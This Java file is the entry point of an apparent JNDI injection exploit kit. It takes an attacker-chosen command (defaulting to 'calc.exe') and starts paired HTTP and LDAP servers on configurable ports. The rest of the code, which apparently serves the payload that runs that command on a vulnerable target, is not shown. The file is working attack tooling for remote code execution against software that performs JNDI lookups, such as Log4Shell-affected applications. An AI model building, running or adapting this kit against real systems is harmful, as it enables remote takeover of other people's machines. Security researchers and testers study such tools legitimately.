package org.sec;

import com.beust.jcommander.JCommander;
import org.apache.log4j.LogManager;
import org.apache.log4j.Logger;
import org.sec.core.http.HttpServer;
import org.sec.core.ldap.LdapServer;
import org.sec.util.StringUtil;

public class Main {
    private static final Logger logger = LogManager.getLogger(Main.class);

    public static void main(String[] args) {
        Logo.print();
        logger.info("start jndi kit");
        Command command = new Command();
        JCommander jc = JCommander.newBuilder().addObject(command).build();
        jc.parse(args);
        if (command.help) {
            jc.usage();
            return;
        }
        String cmd;
        if (command.command == null || command.command.equals("")) {
            cmd = "calc.exe";
        } else {
            cmd = StringUtil.cleanCommand(command.command);
        }
        Config.cmd = cmd;
        Config.httpPort = command.httpPort;
        Config.ldapPort = command.ldapPort;
        try {
            logger.info("cmd: " + Config.cmd);
            new Thread(() -> HttpServer.start(Config.cmd,Config.httpPort)).start();
            new Thread(() -> LdapServer.start(Config.ldapPort)).start();
        } catch (Exception e) {
            logger.error(e.getMessage());
        }
    }
}
